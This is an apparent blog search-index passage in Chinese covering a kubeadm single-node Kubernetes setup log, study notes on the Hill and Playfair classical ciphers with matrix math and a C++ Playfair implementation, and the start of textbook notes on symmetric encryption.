10.96.0.0/12 scheduler: {}kind:ConfigMapmetadata:creationTimestamp:\u0026#34;2021-11-19T02:54:04Z\u0026#34;name:kubeadm-confignamespace:kube-systemresourceVersion:\u0026#34;210\u0026#34;uid:2567d366-2257-4114-8709-12b016cd1fe8  可以发现没有 podSubnet，那就当是默认，按照 calico 文档说明不用改 yaml，正常应用。\n1  sudo kubectl --kubeconfig /etc/kubernetes/admin.conf apply -f calico.yaml   输出如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  configmap/calico-config created customresourcedefinition.apiextensions.k8s.io/bgpconfigurations.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/bgppeers.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/blockaffinities.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/caliconodestatuses.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/clusterinformations.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/felixconfigurations.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/globalnetworkpolicies.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/globalnetworksets.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/hostendpoints.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/ipamblocks.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/ipamconfigs.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/ipamhandles.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/ippools.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/ipreservations.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/kubecontrollersconfigurations.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/networkpolicies.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/networksets.crd.projectcalico.org created clusterrole.rbac.authorization.k8s.io/calico-kube-controllers created clusterrolebinding.rbac.authorization.k8s.io/calico-kube-controllers created clusterrole.rbac.authorization.k8s.io/calico-node created clusterrolebinding.rbac.authorization.k8s.io/calico-node created service/calico-typha created deployment.apps/calico-typha created Warning: policy/v1beta1 PodDisruptionBudget is deprecated in v1.21+, unavailable in v1.25+; use policy/v1 PodDisruptionBudget poddisruptionbudget.policy/calico-typha created daemonset.apps/calico-node created serviceaccount/calico-node created deployment.apps/calico-kube-controllers created serviceaccount/calico-kube-controllers created poddisruptionbudget.policy/calico-kube-controllers created   出现了一个弃用警告，无视之，反正是 calico 的问题。再检查下相关的 POD 创建是否成功，用命令 kubectl get pod -n kube-system，输出如下。\n1 2 3 4 5 6 7 8 9 10 11  NAMESPACE NAME READY STATUS RESTARTS AGE kube-system calico-kube-controllers-5d995d45d6-gwwrw 1/1 Running 0 5m29s kube-system calico-node-sgb2x 0/1 Running 2 (49s ago) 5m29s kube-system calico-typha-7df55cc78b-hpfkx 0/1 Pending 0 5m29s kube-system coredns-7d89d9b6b8-c7sxl 1/1 Running 0 32m kube-system coredns-7d89d9b6b8-tjsj8 1/1 Running 0 32m kube-system etcd-vm 1/1 Running 0 32m kube-system kube-apiserver-vm 1/1 Running 0 32m kube-system kube-controller-manager-vm 1/1 Running 0 32m kube-system kube-proxy-d64kh 1/1 Running 0 32m kube-system kube-scheduler-vm 1/1 Running 0 32m   可以看到至少镜像是拉到了。\ncalico-typha-7df55cc78b-hpfkx 这个 POD 的 describe 显示不能运行在 master 节点。\n1 2 3 4  Events: Type Reason Age From Message ---- ------ ---- ---- ------- Warning FailedScheduling 56s (x9 over 8m57s) default-scheduler 0/1 nodes are available: 1 node(s) had taint {node-role.kubernetes.io/master: }, that the pod didn\u0026#39;t tolerate.   而 calico-node-sgb2x 的日志显示需要 calico-typha 才能运行。\n1 2 3  2021-11-19 03:27:46.413 [ERROR][1674] confd/discovery.go 153: Didn\u0026#39;t find any ready Typha instances. 2021-11-19 03:27:46.413 [FATAL][1674] confd/startsyncerclient.go 48: Typha discovery enabled but discovery failed. error=Kubernetes service missing IP or port bird: Unable to open configuration file /etc/calico/confd/config/bird6.cfg: No such file or directory   因为想要的是一个单节点集群，所以接下来把本节点的污点 node-role.kubernetes.io/master- 给去掉。\n1  sudo kubectl --kubeconfig /etc/kubernetes/admin.conf taint nodes --all node-role.kubernetes.io/master-   输出\n1  node/vm untainted   再观察 kube-system 里的 POD 状态。\n1 2 3 4 5 6 7 8 9 10 11  NAME READY STATUS RESTARTS AGE calico-kube-controllers-5d995d45d6-gwwrw 1/1 Running 0 11m calico-node-sgb2x 1/1 Running 7 (38s ago) 11m calico-typha-7df55cc78b-hpfkx 1/1 Running 0 11m coredns-7d89d9b6b8-c7sxl 1/1 Running 0 38m coredns-7d89d9b6b8-tjsj8 1/1 Running 0 38m etcd-vm 1/1 Running 0 38m kube-apiserver-vm 1/1 Running 0 38m kube-controller-manager-vm 1/1 Running 0 38m kube-proxy-d64kh 1/1 Running 0 38m kube-scheduler-vm 1/1 Running 0 38m   可以看到所有的POD都已经进入Ready状态。\n最后通过 kubectl get nodes -o wide 检查节点状态。\n1 2  NAME STATUS ROLES AGE VERSION INTERNAL-IP EXTERNAL-IP OS-IMAGE KERNEL-VERSION CONTAINER-RUNTIME vm Ready control-plane,master 39m v1.22.4 10.0.2.15 \u0026lt;none\u0026gt; Ubuntu 20.04.3 LTS 5.4.0-90-generic docker://20.10.11   到这里单节点集群就成功部署了。\n总结 之后还可以部署 dashboard 之类的应用验证，不想写了，浪费时间。\n写了一大堆又删掉了。\n如果一定要总结的话，k8s，学了进小厂吧，小厂不用；学了进大厂吧，大厂也不要你。\n","date":"2021-11-25T14:31:00+08:00","permalink":"https://nnnewb.github.io/blog/p/kubernetes-manually-install-by-kubeadm/","title":"kubeadm安装实验集群记录"},{"content":"前言 学习一下 Hill 密码。\n0x01 数学基础 参考了 数学乐 。没有详细介绍矩阵的意义，但基本运算规则之类的讲得很清楚好懂。\n1.1 矩阵 一个矩阵就是n行m列的数字表格，含义暂不考虑，只学习下矩阵的表示方法、运算规则，不然有点难读懂 Hill 密码的规则。\n一个有 m 行，n 列的矩阵 A 的书写形式如下。 $$ A=\\begin{bmatrix} a_{11} \u0026amp; a_{12} \u0026amp; \\dots \u0026amp; a_{1n} \\\\ a_{21} \u0026amp; a_{22} \u0026amp; \\dots \u0026amp; a_{2n} \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \u0026amp; \\vdots \\\\ a_{m1} \u0026amp; a_{m2} \u0026amp; \\dots \u0026amp; a_{mn} \\end{bmatrix} $$\n1.2 矩阵加法/减法 矩阵加减法规则如下。设有矩阵 A、B 如下。 $$ A=\\begin{bmatrix} a_{11} \u0026amp; a_{12} \u0026amp; \\dots \u0026amp; a_{1n} \\\\ a_{21} \u0026amp; a_{22} \u0026amp; \\dots \u0026amp; a_{2n} \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \u0026amp; \\vdots \\\\ a_{m1} \u0026amp; a_{m2} \u0026amp; \\dots \u0026amp; a_{mn} \\end{bmatrix},B=\\begin{bmatrix} b_{11} \u0026amp; b_{12} \u0026amp; \\dots \u0026amp; b_{1n} \\\\ b_{21} \u0026amp; b_{22} \u0026amp; \\dots \u0026amp; b_{2n} \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \u0026amp; \\vdots \\\\ b_{m1} \u0026amp; b_{m2} \u0026amp; \\dots \u0026amp; b_{mn} \\end{bmatrix} $$ 则计算 A±B 的规则如下。 $$ A±B=\\begin{bmatrix} a_{11}±b_{11} \u0026amp; a_{12}±b_{12} \u0026amp; \\dots \u0026amp; a_{1n}±b_{1n} \\\\ a_{21}±b_{21} \u0026amp; a_{22}±b_{22} \u0026amp; \\dots \u0026amp; a_{2n}±b_{2n} \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \u0026amp; \\vdots \\\\ a_{m1}±b_{m1} \u0026amp; a_{m2}±b_{m2} \u0026amp; \\dots \u0026amp; a_{mn}±b_{mn} \\end{bmatrix} $$ 性质：\n 只有行列数相同的矩阵，加减法才有意义 矩阵的加减法，就是矩阵中相同位置元素加减 矩阵加减法满足 交换律（A+B=B+A） 和 结合律 （A+(B+C)=(A+B)+c）  1.2 矩阵数乘 数λ乘矩阵 A，即使将数λ乘矩阵A中的每一个元素，记为 λA 或 Aλ。\n特别的，称 -A 为 A 的负矩阵。\n性质：\n 满足 结合律 （(λμ)A=λ(μA); (λ+μ)A=λA+μA） 和 分配律 （λ(A+B)=λA+λB）  1.3 矩阵乘法 先看矩阵的另一种表示形式：A=(aij)mxs ，这种表示形式中，m 表示行数，s 表示列数，aij 姑且当占位，表示矩阵元素。\n设 A=(aij)mxs B=(bij)sxn ，则 A=AB 是这样一个矩阵：\n 行数和左矩阵 A 相同，列数和右矩阵 B 相同，即 C=(cij)mxn 。 C 的第 i 行第 j 列的元素 cij 由 A 的第 i 行元素和 B 的第 j 列元素对应相乘，再取乘积之和。  举例来说，将这两个矩阵相乘。\n$$ A=\\begin{bmatrix} 1 \u0026amp; 2 \\\\ 1 \u0026amp; -1 \\end{bmatrix},B= \\begin{bmatrix} 1 \u0026amp; 2 \u0026amp; -3 \\\\ -1 \u0026amp; 1 \u0026amp; 2 \\end{bmatrix} $$ 结果是一个 2x3 的矩阵，每个元素计算如下： $$ AB=\\begin{bmatrix} (1×1+2×-1) \u0026amp; (1×2+2×1) \u0026amp; (1×-3+2×2) \\\\\t(1×1+-1×-1) \u0026amp; (1×2+-1×1) \u0026amp; (1×-3+-1×2) \\end{bmatrix}= \\begin{bmatrix} -1 \u0026amp; 4 \u0026amp; 1 \\\\\t2 \u0026amp; 1 \u0026amp; -5 \\end{bmatrix} $$ 先用 A 的第1行，分别乘 B 的第1、2、3列，作为结果矩阵 C 的第1行。然后用 A 的第2行，分别乘 B 的第1、2、3列，作为结果矩阵 C 的第二行。\n注意：相乘的矩阵应该满足条件，左侧矩阵列数等于右侧矩阵行数，计算才能进行。\n性质（假设运算都是可行的）：\n 符合结合律 (AB)C=A(BC) 符合分配律 A(B±C)=AB±AC （左分配律）; (B±C)A=BA±CA （右分配律） (λA)B=λ(AB)=A(λB)  1.4 矩阵转置 将 A 矩阵的行换成同序号的列所得到的新矩阵称为 A 的转置矩阵，记作 A' 或者 AT 。 $$ A= \\begin{bmatrix} 1 \u0026amp; 0 \u0026amp; 3 \u0026amp; -1 \\\\ 2 \u0026amp; 1 \u0026amp; 0 \u0026amp; 2 \\end{bmatrix},A'=A^T= \\begin{bmatrix} 1 \u0026amp; 2 \\\\ 0 \u0026amp; 1 \\\\ 3 \u0026amp; 0 \\\\ -1 \u0026amp; 2 \\end{bmatrix} $$ 性质：\n (A')'=A (A+B)'=A'+B' (AB)'=B\u0026rsquo;A' (λA)'=λA'，λ是常数  1.5 对称矩阵 如果矩阵 A 满足 A'=A ，即 aij=aji ，则称 A 为 对称矩阵。\n对称矩阵的特点是它的元素以主对角线为对称轴对应相等。\n举例如下。 $$ A=\\begin{bmatrix} 1 \u0026amp; 2 \u0026amp; 3 \\\\ 2 \u0026amp; 1 \u0026amp; 2 \\\\ 3 \u0026amp; 2 \u0026amp; 1 \\end{bmatrix} $$\n尝试将这个矩阵转置，令 aij=aji ，得到下面的矩阵，发现的确和原矩阵相同。 $$ A'=\\begin{bmatrix} a_{11} \u0026amp; a_{21} \u0026amp; a_{31} \\\\ a_{12} \u0026amp; a_{22} \u0026amp; a_{32} \\\\ a_{13} \u0026amp; a_{23} \u0026amp; a_{33} \\end{bmatrix}= \\begin{bmatrix} 1 \u0026amp; 2 \u0026amp; 3 \\\\ 2 \u0026amp; 1 \u0026amp; 2 \\\\ 3 \u0026amp; 2 \u0026amp; 1 \\end{bmatrix} $$\n而原矩阵关于主对角线对称。\n1.6 单位矩阵 单位矩阵是除了主对角线上是1，其他数字都是0的矩阵。任何矩阵和单位矩阵相乘都等于自身。\n比如下面这个 3x3 矩阵。 $$ I=\\begin{bmatrix} 1 \u0026amp; 0 \u0026amp; 0 \\\\ 0 \u0026amp; 1 \u0026amp; 0 \\\\ 0 \u0026amp; 0 \u0026amp; 1 \\end{bmatrix} $$\n1.7 逆矩阵 如果有矩阵 B ，令 BA=AB=I，其中 I 为单位矩阵，则称 B 为 A 的逆矩阵，记为 A-1 。对任意矩阵 A ，逆矩阵并不一定存在。\n逆矩阵的作用是一定程度上代替了矩阵除法运算（矩阵不能做除法），例如已知矩阵A、B，求矩阵X，有下面的式子。\nXA=B\n如果有除法，那可以直接移项 X=B/A ，但矩阵只能相乘，所以我们可以在两边都乘上 A 的逆矩阵 A-1 。\nXAA-1=BA-1\n因为 AA-1 得单位矩阵 I ，所以左侧就变成了 XI。又因为任何矩阵和单位矩阵相乘都等于自身，所以 XI 可以简化为 X 。于是就得到了：\nX=BA-1\n但是要注意次序！ AX=B 不能用上述方法做，因为矩阵乘法不一定满足结合律 （AB=BA），对于 AX=B 的情况，可以将 A-1 放在式子之前，也就是 A-1AX=A-1B 。\n1.8 行列式（拉普拉斯展开） 矩阵 A 的行列式记为 |A| ，和绝对值符号一样。只有方形矩阵才能计算行列式。方形矩阵就是行和列数目相等的矩阵。\n首先看 2x2 矩阵。 $$ A=\\begin{bmatrix} a \u0026amp; b \\\\ c \u0026amp; d \\end{bmatrix},|A|=ad-bc $$ 2x2矩阵的行列式就是简单的交叉相乘再相减。下图中蓝色是正，红色是负。\n再看 3x3 矩阵的行列式写法，用矩阵第一行的元素，逐个去乘不在和这个元素同一行同一列元素的行列式，最后把这些值用加减号连起来。 $$ \\begin{vmatrix} a \u0026amp; b \u0026amp; c \\\\ d \u0026amp; e \u0026amp; f \\\\ g \u0026amp; h \u0026amp; i \\end{vmatrix}= a \\begin{vmatrix} e \u0026amp; f \\\\ h \u0026amp; i \\end{vmatrix} -b \\begin{vmatrix} d \u0026amp; f \\\\ g \u0026amp; i \\end{vmatrix} +c \\begin{vmatrix} d \u0026amp; e \\\\ g \u0026amp; h \\end{vmatrix} =a(ei-fh)-b(di-fg)+c(dh-eg) $$ 更直观的图形化表示：\n注意这个过程中的加减符号规律，a11×(\u0026hellip;) 是正，a12×(\u0026hellip;) 是负，a13×(\u0026hellip;) 又是正。\n知晓这些规律后再看更大的矩阵，也可以依葫芦画瓢写出行列式。\n留意其中正负号出现的规律，+a11 -a12 +a13 -a14 。\n这种计算方法叫做 拉普拉斯展开 。\n1.9 求逆矩阵的方法  2x2 矩阵的逆矩阵 初等行运算 余子式、代数余子式和伴随来求逆矩阵  2x2 矩阵的逆矩阵是： $$ A^{-1}=\\begin{bmatrix} a \u0026amp; b \\\\ c \u0026amp; d \\end{bmatrix}^{-1}= \\frac{1}{|A|} \\begin{bmatrix} d \u0026amp; -b \\\\ -c \u0026amp; a \\end{bmatrix} $$\n 调换 a11 和 a22 a12 和 a21 加上负号 除以原矩阵的行列式  3x3 或更大的矩阵的逆矩阵求法可以用 初等行运算 或 用余子式、代数余子式和伴随 来求逆矩阵 。\n0x02 Hill 密码 2.1 加密过程 首先给定一个密码矩阵 A。 $$ A=\\begin{bmatrix} 1 \u0026amp; 2 \\\\\t3 \u0026amp; 4 \\end{bmatrix} $$\n再给出明文：The quick brown fox jumps over the lazy dog\n将明文转换成数字（ASCII），两个一组。比如 Th 就是 84 104 ，写成矩阵形式就是这样。\n$$ P=\\begin{bmatrix} 84 \\\\ 104 \\end{bmatrix} $$\n将密码矩阵 A 左乘明文矩阵 P ，C=AP，我们就得到了密文。\n$$ C=AP=\\begin{bmatrix} 1 \u0026amp; 2 \\\\\t3 \u0026amp; 4 \\end{bmatrix} \\begin{bmatrix} 84 \\\\\t104 \\end{bmatrix}= \\begin{bmatrix} 292 \\\\\t668 \\end{bmatrix} $$\n2.2 解密过程 解密过程就是利用密码矩阵的逆矩阵 A-1 ，从密文求明文的过程，公式 A-1C=A-1AP 。\n2x2 矩阵的逆矩阵求解方法看前面 1.9，求得逆矩阵如下。\n$$ A^{-1}=\\begin{bmatrix} -2 \u0026amp; 1 \\\\\t1.5 \u0026amp; -0.5 \\end{bmatrix} $$\n然后使用逆矩阵左乘密文：\n$$ P=A^{-1}C=\\begin{bmatrix} -2 \u0026amp; 1 \\\\\t1.5 \u0026amp; -0.5 \\end{bmatrix} \\begin{bmatrix} 292 \\\\\t668 \\end{bmatrix}= \\begin{bmatrix} 84 \\\\\t104 \\end{bmatrix} $$\n即可得到明文。\n2.3 安全性 Hill密码的安全性体现在隐藏了单个字母的频率信息，加密矩阵越大效果越好。\nHill密码无法抵抗已知明文攻击，已知明文和密文时完全可以计算出加密矩阵。\n总结 重点：\n 矩阵乘法、单位矩阵、行列式和逆矩阵  Hill密码是将明文转为矩阵后和加密矩阵相乘，加密矩阵即为加密密钥，加密矩阵越大效果越好。解密使用加密矩阵的逆矩阵作为密钥。\nHill 密码能隐藏字母频率信息，对抗仅密文分析，但无法对抗已知明文分析。\n","date":"2021-11-16T11:31:00+08:00","image":"https://nnnewb.github.io/blog/p/cryptography-introduction-03/cover_hu0e9b28c8bfc106532b4dce6f21f139c2_149022_120x120_fill_q75_box_smart1.jpg","permalink":"https://nnnewb.github.io/blog/p/cryptography-introduction-03/","title":"密码学入门03 - 古典密码#3"},{"content":"前言 从单表代替密码开始，继续学习古典密码。\n0x01 playfair 密码 playfair 这个词乍一听我甚至有点迷惑，啥意思，公平竞赛吗。之后才知道原来是人名。\n概述 playfair 密码是最著名的多字母代替密码，它把明文中的字母对转换成密文的字母对，每次加密输入两个字母，输出两个字母。\nplayfair 算法基于一个由密钥词构成的 5x5 字母矩阵，将密钥词去除重复字母后，和字母表剩余的字母按左至右、上至下的顺序填充进表里。\n举例来说，用 pojie 作为密钥词。\n   - - - - -     p o j i e   a b c d f   g/h k l m n   q r s t u   v w x y z    需要注意的是字母表有26个字母，但 playfair 的字母矩阵只有 25 个空格。出现字母表不是 5 的整数倍的情况时可以选择将多出来的字母视作同一个，或者去掉不常用的字母，使其正好填满矩阵。比如图中的g/h，好孩子不要学哦。常见的情况是i/j或者去掉z或q。\n加密过程 加密过程如下。\n第一步：将明文分成两个字母一组，两个字母重复的话就在中间填x重新分组；如果最后剩下一个字母的话，也添加x分成一组。举例来说，对单词balloon，直接分组的话就是ba、ll、on，填x重新分组就是ba、lx、lo、on。\n分组后，对每个组进行加密，依然是 balloon 为例。首先第一组 ba。\n第二步：找出两个字母在上面表格里的行列坐标。\n b 是第 2 行第 2 列。 a 是第 1 行第 2 列。  第三步：按规则选择代替的字母\n 如果两个字母不同行也不同列，则选择本字母所在行、分组中另一个字母所在列的字母代替。 如果两个字母在同一行，则选择明文右边的字母代替。明文在最右边则由最左边的字母代替。 如果两个字母在同一列，则选择明文下边的字母代替。明文在最底下则由最上边的字母代替。  比如 balloon 加密后，就是 bcsjkjek 。\n特点 playfair 有 26x26 个字母对，因此识别出单个字母对相对简单的单表代替算法要困难得多。字母对的相对频率比字母的相对频率变化幅度小，利用频率分析字母对更困难。\nplayfair 仍然是相对容易攻破的，因为它的密文仍然完好保留了明文语言的大部分结构特征，几百个字母的密文就足够分析出规律了。\n图中显示了 playfair 密码和其他一些密码加密的有效性，标有明文的曲线画出了超过从7w个字母的文章中得到的频率分布。曲线代表这样的含义：对文章中出现的每个字母计数，计数结果除以使用频率最高的字母出现次数。假设使用频率最高的字母 e 出现的频率为 1 ，那么 t 出现的频率就是 0.76 等等。\n图中的横轴表示字母，纵轴表示字母出现的频率。 曲线体现了加密后字母频率分布被掩盖的程度。如果频率分布的信息完全被加密过程给隐藏了，那么密文的频率曲线应该是一条水平的线，唯密文密码分析由此下手将一无所获。\n图中所示的频率曲线表明 playfair 密码虽然有比明文稍平坦的频率分布曲线，但仍然透露了大量信息给密码分析者。\n代码实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123  #include \u0026lt;algorithm\u0026gt;#include \u0026lt;array\u0026gt;#include \u0026lt;cctype\u0026gt;#include \u0026lt;cstddef\u0026gt;#include \u0026lt;cstdlib\u0026gt;#include \u0026lt;iostream\u0026gt;#include \u0026lt;iterator\u0026gt;#include \u0026lt;ostream\u0026gt;#include \u0026lt;set\u0026gt;#include \u0026lt;string\u0026gt;#include \u0026lt;unordered_set\u0026gt;#include \u0026lt;utility\u0026gt; constexpr const char *lowercase = \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34;; // 保持顺序的情况下，对输入文本去重，并且从文本里把字符j替换成i std::string my_unique(const std::string \u0026amp;text) { std::string ret = text; std::replace(ret.begin(), ret.end(), \u0026#39;j\u0026#39;, \u0026#39;i\u0026#39;); std::unordered_set\u0026lt;char\u0026gt; s; auto last = std::stable_partition(ret.begin(), ret.end(), [\u0026amp;s](int n) { bool ret = !s.count(n); // not exists  s.insert(n); return ret; }); ret.erase(last, ret.end()); return ret; } // 从密钥字符串构造出 playfair 密钥矩阵 std::array\u0026lt;std::string, 5\u0026gt; playfair_matrix(const std::string \u0026amp;key) { // 初始化密钥，构造的密钥中没有 j，加密时 j 视作 i 处理  std::string fullkey = my_unique(key + lowercase); if (fullkey.length() % 5) { std::cerr \u0026lt;\u0026lt; \u0026#34;invalid key length\u0026#34; \u0026lt;\u0026lt; std::endl; exit(1); } // 构造矩阵  std::array\u0026lt;std::string, 5\u0026gt; matrix; int count = 0; for (auto c : fullkey) { matrix[count / 5].push_back(c); ++count; } return matrix; } // 用迭代器读取一组两个字符（从当前位置开始，*iter 和 *(iter+1) 为一组）。 // 如果后续两个字符重复，则取一个字符加上 x 返回； // 如果后续仅剩一个字符也加上 x 返回。 std::array\u0026lt;char, 2\u0026gt; next2(std::string::const_iterator \u0026amp;it, std::string::const_iterator end) { std::array\u0026lt;char, 2\u0026gt; ret; if (it + 1 == end || *it == *(it + 1)) { ret[0] = tolower(*(it++)); ret[1] = \u0026#39;x\u0026#39;; } else { ret[0] = tolower(*(it++)); ret[1] = tolower(*(it++)); } return ret; } // 获得字符在密钥矩阵中的坐标，返回 (行,列) std::pair\u0026lt;int, int\u0026gt; get_row_col(std::array\u0026lt;std::string, 5\u0026gt; matrix, char c) { for (size_t r = 0; r \u0026lt; matrix.size(); ++r) { const auto \u0026amp;row = matrix[r]; auto col = row.find(c); if (col != row.npos) { return std::make_pair(r, col); } } return std::make_pair(-1, -1); } // playfair 加密函数 std::string playfair_cipher(const std::string \u0026amp;input, const std::string \u0026amp;key) { std::string ciphertext; auto matrix = playfair_matrix(key); auto it = input.cbegin(); while (it != input.cend()) { auto char_pair = next2(it, input.cend()); auto c1_pos = get_row_col(matrix, char_pair[0] == \u0026#39;j\u0026#39; ? \u0026#39;i\u0026#39; : char_pair[0]); auto c2_pos = get_row_col(matrix, char_pair[1] == \u0026#39;j\u0026#39; ? \u0026#39;i\u0026#39; : char_pair[1]); if (c1_pos.first == c2_pos.first) { // 同一行，取同行下一个字符  auto row = c1_pos.first; auto c1_col = c1_pos.second + 1 \u0026gt;= 5 ? 0 : c1_pos.second + 1; auto c2_col = c2_pos.second + 1 \u0026gt;= 5 ? 0 : c2_pos.second + 1; ciphertext.push_back(matrix[row][c1_col]); ciphertext.push_back(matrix[row][c2_col]); } else if (c1_pos.second == c2_pos.second) { // 同一列，取同列下一个字符  auto col = c1_pos.second; auto c1_row = c1_pos.first + 1 \u0026gt;= 5 ? 0 : c1_pos.first + 1; auto c2_row = c2_pos.first + 1 \u0026gt;= 5 ? 0 : c2_pos.first + 1; ciphertext.push_back(matrix[c1_row][col]); ciphertext.push_back(matrix[c2_row][col]); } else { // 不同行也不同列，取本行，另一字符所在列的字符  auto row = c1_pos.first; auto c1_col = c2_pos.second; auto c2_col = c1_pos.second; ciphertext.push_back(matrix[row][c1_col]); ciphertext.push_back(matrix[row][c2_col]); } } return ciphertext; } int main(void) { for (const auto \u0026amp;row : playfair_matrix(\u0026#34;haoye\u0026#34;)) { std::cout \u0026lt;\u0026lt; row \u0026lt;\u0026lt; std::endl; } std::cout \u0026lt;\u0026lt; \u0026#34;ciphertext:\u0026#34; \u0026lt;\u0026lt; playfair_cipher(\u0026#34;helloworld\u0026#34;, \u0026#34;haoye\u0026#34;) \u0026lt;\u0026lt; std::endl; return 0; }   以上是 playfair 加密的 c++ 实现。比较怪的是 playfair 网上可以找到很多变体，比如 practice cryptography 描述和实现的 playfair 算法是在分组阶段，把重复出现的第二个字符替换成 x 。\n解密没有在这里实现，解密函数规则如下：\n 如果一组两个字母在同一行，则用前一列字母替换，第一列用最后一列字母替换。 如果一组两个字母在同一列，则用前一行字母替换，第一行用最后一行字母替换。 如果一组两个字符不在同一列同一行，则取同一行，一组中另一字母所在列的字母替换。  就是把加密规则反过来执行，唯一的区别是在分组阶段不用考虑相同字母，出现相同字母说明密文有问题，可以跳过这一组字母。最后解密结果会出现多余的x，如果明文包含j的话解密结果会变成i。\n结论 简要描述 playfair 算法加密过程：\n 从密钥构造 5x5 矩阵 对明文按两个字母一组分组，分组过程中处理连续重复字符（重复字母间插入x）和孤立字母（末尾剩余的最后一个字母也加上x） 按规则，对一组两个字母进行替换，直到所有明文都被替换完成  如果两个字母在矩阵同一行，取字母在本行的下一个字母替换，行末字母取行首。 如果两个字母在矩阵同一列，取字母在本列的下一个字母替换，列末字母取列首。 如果不同行不同列，取字母本行，本组另一字母所在列的字母替换。    playfair 密码的相比简单单表替换，分析难度大得多。但依然完整保留了语言的结构特征，因此分析依然比较容易。\n","date":"2021-11-11T16:53:00+08:00","image":"https://nnnewb.github.io/blog/p/cryptography-introduction-02/cover_hu0e9b28c8bfc106532b4dce6f21f139c2_149022_120x120_fill_q75_box_smart1.jpg","permalink":"https://nnnewb.github.io/blog/p/cryptography-introduction-02/","title":"密码学入门02 - 古典密码#2"},{"content":"前言 本文是学习《密码编码学与网络安全》一书的笔记，关于传统加密技术一章。\n0x01 对称密码模型 对称加密，也称传统加密或单钥加密，是20世纪70年代公钥密码产生之前唯一的加密类型。迄今为止，它仍是使用最广泛的加密类型。\n对称加密方案有5个基本成分：\n 明文：原始可以理解的消息或数据，是算法的输入。 加密算法：加密算法对明文进行各种代替和变换。 密钥：密钥也是加密算法的输入。密钥独立于明文和算法。算法根据所用的特定密钥而产生不同的输出。算法所用的确切代替和变换也依靠密钥。 密文：作为算法的输出，看起来完全随机而杂乱的消息，依赖于明文和密钥。对于给定的消息，不同密钥产生不同的密文，密文看上去是随机的数据流并且其意义是不可理解的。 解密算法：本质上是加密算法的逆运算。输入密文和密钥，输出原始明文。  传统密码的安全使用要满足两个要求：\n 加密算法必须是足够强的。即使攻击者拥有一定数量的密文和产生这些密文的明文，他也不能破译密文或发现密钥。 发送者和接收者必须在某种安全的形式下获得密钥并保证密钥安全。如果有人发现密钥，并知道算法，就能解读使用该密钥加密的所有通信。  我们假设基于已知密文和加密/解密算法而破译消息是不实际的，我们不需要算法保密，仅需要密钥保密。如果密钥是由信息的发送方产生的，那么它要通过某种安全信道发送到接收方；另一种是由第三方生成密钥后再安全地分发给发送方和接收方。\n1 2 3 4 5 6 7 8  // 明文X，共 m 个元素 byte[m] X = {X1,X2,X3,X4,...,Xm}; // 密钥K，共 j 个元素 byte[j] K = {K1,K2,K3,K4,...,Kj}; // 加密算法E，以明文和密钥为输入，输出密文 Y byte[n] Y = E(X, K); // 解密算法D，以密文和密钥为输入，输出明文 X byte[] X = D(Y, K);   1.1 密码编码学 密码编码系统有三个独立特征：\n 转换明文为密文的运算类型。所有的加密算法都基于两个原理：代替和置换。代替是将明文中的每个元素（如位、字母、位组或字母组）映射成另一个元素；置换是将明文中的元素重新排列。上述运算的基本要求是不允许有信息丢失（所有运算都是可逆的）。大多密码体制也称为乘积密码系统，都使用了多层代替和置换。 所用的密钥数。如果发送方和接收方使用相同的密钥，这种密码就称为对称密码、单密钥密码或传统密码。如果发收双方使用不同的密钥，这种密码就称为非对称密码、双钥或公钥密码。 处理明文的方法。分组密码每次处理输入的一组元素，相应地输出一组元素。流密码则是连续地处理输入元素，每次输出一个元素。  攻击密码系统的典型目标是恢复使用的密钥，而不仅仅恢复出单个密文对应的明文。攻击传统密码有两种通用的方法。\n 密码分析学：密码分析学攻击依赖于算法的性质、明文的一般特征或某些明密文对。这种攻击形式企图利用算法的特征来推导出特定的明文或使用的密钥。 穷举攻击：攻击者对一条密文尝试所有可能的密钥，直到把它转化为可读的有意义的明文。平均而言，获得成功至少要尝试所有可能的密钥的一半。  基于密码分析者知道的信息的多少，概括密码攻击的几种类型如下。\n   攻击类型 攻击者已知的信息     唯密文攻击 加密算法；密文；   已知明文攻击 加密算法；密文；与待解密密文同一密钥加密的一个或多个明密文对；   选择明文攻击 加密算法；密文；分析者选择的明文，以及对应的（使用和待解密密文同一密钥）加密的密文；   选择密文攻击 加密算法；密文；分析者选择的密文，以及对应的（使用和待解密密文同一密钥）的解密明文；   选择文本攻击 加密算法；密文；分析者选的明文，以及对应的密文；分析者选择的密文，以及对应的明文，使用和待解密密文同一密钥。    唯密文攻击最容易防范，但很多情况下分析者可以得到更多的信息。比如 postscript 